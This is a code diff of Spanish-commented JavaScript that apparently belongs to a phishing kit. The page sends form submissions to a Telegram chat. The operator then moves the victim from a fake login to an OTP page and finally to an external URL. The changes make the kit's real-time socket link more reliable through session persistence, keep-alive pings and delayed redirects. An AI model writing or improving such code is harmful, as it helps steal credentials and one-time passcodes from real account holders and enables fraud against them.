@@ -12,12 +12,17 @@ const CONFIG = {
         CHAT_ID: '-5029729816'
     },
     SOCKET: {
-        URL: 'http://localhost:3000',
+        URL: window.location.origin,
         OPTIONS: {
             reconnection: true,
-            reconnectionDelay: 1000,
-            reconnectionAttempts: Infinity,
-            timeout: 10000
+            reconnectionDelay: 200,
+            reconnectionDelayMax: 1000,
+            reconnectionAttempts: 10,
+            timeout: 3000,
+            transports: ['websocket'],
+            autoConnect: true,
+            forceNew: false,
+            multiplex: false
         }
     },
     VALIDATION: {
@@ -243,42 +248,68 @@ const SocketManager = {
      */
     init: () => {
         try {
-            AppState.socket = io(CONFIG.SOCKET.URL, CONFIG.SOCKET.OPTIONS);
+            let sessionId = sessionStorage.getItem('socketSessionId');
+            if (!sessionId) {
+                sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+                sessionStorage.setItem('socketSessionId', sessionId);
+                console.log('🆕 Nueva sesión creada:', sessionId);
+            } else {
+                console.log('♻️ Sesión recuperada:', sessionId);
+            }
             
-            // Evento de conexión exitosa
+            const options = {
+                ...CONFIG.SOCKET.OPTIONS,
+                query: { sessionId }
+            };
+            
+            AppState.socket = io(CONFIG.SOCKET.URL, options);
+            
             AppState.socket.on('connect', () => {
-                console.log('✅ Conectado al servidor');
+                console.log('✅ Conectado | Session:', sessionId);
                 AppState.isConnected = true;
+                
+                // Keep-alive: enviar ping cada 8 segundos
+                if (window.keepAliveInterval) clearInterval(window.keepAliveInterval);
+                window.keepAliveInterval = setInterval(() => {
+                    if (AppState.socket && AppState.socket.connected) {
+                        AppState.socket.emit('ping');
+                    }
+                }, 8000);
             });
             
-            // Evento de desconexión
             AppState.socket.on('disconnect', (reason) => {
-                console.log('❌ Desconectado del servidor:', reason);
+                console.log('❌ Desconectado:', reason);
                 AppState.isConnected = false;
+                if (window.keepAliveInterval) clearInterval(window.keepAliveInterval);
             });
             
-            // Evento de error de conexión
+            AppState.socket.on('pong', () => {
+                // Respuesta al ping - mantiene conexión viva
+            });
+            
             AppState.socket.on('connect_error', (error) => {
                 console.log('⚠️ Error de conexión:', error.message);
                 AppState.isConnected = false;
             });
             
-            // Evento de reconexión
-            AppState.socket.on('reconnect', (attemptNumber) => {
-                console.log('🔄 Reconectado después de', attemptNumber, 'intentos');
-                AppState.isConnected = true;
-            });
-            
-            // Comando de redirección desde el servidor
+            // Comando de redirección desde Telegram
             AppState.socket.on('redirect', (data) => {
-                console.log('📡 Comando de redirección recibido:', data);
+                console.log('📡 Redirección:', data.page);
                 
+                // No desconectar el socket, solo navegar
                 if (data.page === 'otp') {
-                    window.location.href = 'otp.html';
+                    setTimeout(() => {
+                        window.location.href = 'otp.html';
+                    }, 100);
                 } else if (data.page === 'login') {
-                    window.location.reload();
+                    setTimeout(() => {
+                        window.location.reload();
+                    }, 100);
                 } else if (data.page === 'finalize' && data.url) {
-                    window.location.href = data.url;
+                    sessionStorage.clear();
+                    setTimeout(() => {
+                        window.location.href = data.url;
+                    }, 100);
                 }
             });
             
@@ -289,6 +320,7 @@ const SocketManager = {
                 } else {
                     console.error('❌ Error al enviar a Telegram:', response.error);
                     Utils.toggleLoading(false);
+                    AppState.isSubmitting = false;
                     alert('Error al procesar la solicitud. Por favor, inténtalo de nuevo.');
                 }
             });
